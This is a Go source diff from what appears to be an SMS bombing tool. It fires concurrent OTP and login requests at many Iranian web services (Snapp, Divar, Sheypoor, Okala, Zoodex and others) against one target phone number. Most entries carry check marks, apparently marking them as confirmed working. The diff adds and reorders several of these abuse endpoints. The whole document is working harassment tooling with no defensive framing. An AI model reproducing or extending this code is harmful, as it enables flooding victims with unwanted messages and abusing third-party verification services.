@@ -791,7 +791,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell", payload, &wg, ch)
 			}
 		}(client)
-	        // Telewebion
+	        // Telewebion ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1260,7 +1260,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// janebi.com (SMS - POST Form)
+		// janebi.com (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1308,7 +1308,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON)
+		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1329,7 +1329,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// https://poltalk.me/api/v1/auth/phone (JSON)
+		// https://poltalk.me/api/v1/auth/phone (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1360,7 +1360,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// https://api.snapp.doctor/
+		// https://api.snapp.doctor/ ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1409,7 +1409,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// mediana.ir (POST JSON)
+		// mediana.ir (POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1521,7 +1521,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// api.nobat.ir
+		// api.nobat.ir ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1533,7 +1533,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// snapp.market 
+		// snapp.market  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1543,6 +1543,16 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, urlWithQuery, formData, &wg, ch) 
 			}
 		}(client) 
+
+		// snapp.market(JSON) ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
+					"cellphone": phone,
+				}, &wg, ch)
+			}
+		}(client)
 
 		// sabziman.com ✅ 
 		wg.Add(1)
@@ -1555,7 +1565,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// api.achareh.co
+		// api.achareh.co ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1567,7 +1577,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// ghasedak24.com (Form)
+		// ghasedak24.com (Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1641,7 +1651,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// okala.com - OTPRegister (JSON)
+		// okala.com - OTPRegister (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1751,7 +1761,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch) 
 			}
 		}(client) 
-		// sandbox.sibbazar.com (JSON)
+		// sandbox.sibbazar.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1761,7 +1771,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// core.gapfilm.ir (JSON)
+		// core.gapfilm.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1781,7 +1791,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// divar.ir (JSON)
+		// divar.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1880,7 +1890,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// otaghak.com (JSON)
+		// otaghak.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1930,7 +1940,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// sheypoor.com (JSON)
+		// sheypoor.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1970,7 +1980,8 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// snapp.taxi (JSON)
+// az in 4 ta 2 tashon ehtemalan dorost bashan...
+		// snapp.taxi (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1980,7 +1991,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// api.snapp.ir (JSON)
+		// api.snapp.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1990,11 +2001,21 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// snapp.market(JSON)
+		// digitalsignup.snapp.ir ✅ 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{ 
+					"cellphone": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// digitalsignup.snapp.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
+				sendJSONRequest(c, ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
 					"cellphone": phone,
 				}, &wg, ch)
 			}
@@ -2030,7 +2051,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// barghman (JSON)
+		// barghman (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -2068,26 +2089,6 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client) 
-
-		// digitalsignup.snapp.ir
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{ 
-					"cellphone": phone,
-				}, &wg, ch)
-			}
-		}(client) 
-
-		// digitalsignup.snapp.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
-					"cellphone": phone,
-				}, &wg, ch)
-			}
-		}(client)
 
 		// Snappfood (Form)
 		wg.Add(1)
